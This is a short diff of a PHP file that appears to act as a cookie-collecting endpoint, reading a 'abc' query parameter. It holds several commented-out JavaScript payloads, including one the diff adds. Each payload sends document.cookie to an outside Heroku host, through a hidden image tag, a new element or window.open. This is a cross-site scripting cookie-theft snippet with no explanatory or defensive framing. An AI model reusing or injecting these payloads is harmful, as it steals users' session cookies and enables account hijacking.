@@ -36,6 +36,6 @@ if (isset($_GET["abc"])) {
 //$("#top_banner").after('<img style="display: none;" src="https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie + '" />');
 //window.open( "https://yeuvephp.herokuapp.com/abc.php?abc=" +document.cookie, "_blank");
     //document.querySelector(".example");
-
+//var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);
 }
 ?>
